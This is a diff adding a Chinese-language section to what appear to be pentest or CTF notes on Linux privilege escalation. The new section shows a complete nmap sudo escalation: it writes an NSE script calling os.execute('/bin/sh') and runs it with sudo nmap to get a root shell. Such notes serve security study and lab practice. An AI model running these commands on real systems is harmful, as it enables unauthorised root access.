@@ -146,6 +146,21 @@ screen -ls
 /tmp/rootshell
 whoami
 ```
+
+#### nmap提权
+
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+sudo -l  # nmap提权
+# 提权思路： 将root权限bin/sh写入脚本插件，使用nmap运行脚本插件使用namp执行脚本，执行命令不会显示命令，建议使用python交互shell后更直观，提权成功
+nmap -v
+
+echo 'os.execute("/bin/sh")' > /tmp/root.nse
+cat /tmp/root.nse
+sudo nmap --script=/tmp/root.nse
+whoami
+```
+
 ## 参考文章
 
 * https://wiki.xazlsec.com/project-9/doc-730/
